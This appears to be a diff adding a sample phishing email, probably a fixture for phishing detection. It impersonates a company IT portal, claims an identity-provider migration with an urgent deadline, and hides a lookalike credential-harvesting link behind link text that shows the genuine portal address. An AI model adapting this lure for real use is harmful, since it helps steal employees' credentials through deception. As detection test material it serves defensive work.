@@ -1,0 +1,44 @@
+Return-Path: <it-portal@contoso-helpdesk.example>
+Received: from mail.contoso-helpdesk.example (mail.contoso-helpdesk.example [203.0.113.150])
+	by mx.contoso.example with ESMTPS id 7d81aa; Sat, 19 Sep 2026 02:05:17 +0000
+Authentication-Results: mx.contoso.example;
+	spf=pass smtp.mailfrom=contoso-helpdesk.example;
+	dkim=pass header.d=contoso-helpdesk.example;
+	dmarc=none header.from=contoso-helpdesk.example
+Message-ID: <hd-33910@contoso-helpdesk.example>
+Date: Sat, 19 Sep 2026 02:05:16 +0000
+From: "Contoso IT Portal" <it-portal@contoso-helpdesk.example>
+To: jordan.reyes@contoso.example
+Subject: Action needed: re-authenticate to keep access to the employee portal
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="b1_ph08"
+
+--b1_ph08
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Dear employee,
+
+We are migrating the employee portal to a new identity provider this
+weekend. All staff must re-authenticate before Monday 07:00 to avoid
+losing access to payroll, timesheets and benefits.
+
+Sign in at https://portal.contoso.example/sso to complete the migration.
+
+Contoso IT
+
+--b1_ph08
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html><body style="font-family:Segoe UI,Arial,sans-serif">
+<p>Dear employee,</p>
+<p>We are migrating the employee portal to a new identity provider this
+weekend. All staff must re-authenticate before <b>Monday 07:00</b> to avoid
+losing access to payroll, timesheets and benefits.</p>
+<p>Sign in at <a href="https://sso-contoso-migrate.example/auth/login?u=jordan.reyes">https://portal.contoso.example/sso</a>
+to complete the migration.</p>
+<p>Contoso IT</p>
+</body></html>
+
+--b1_ph08--
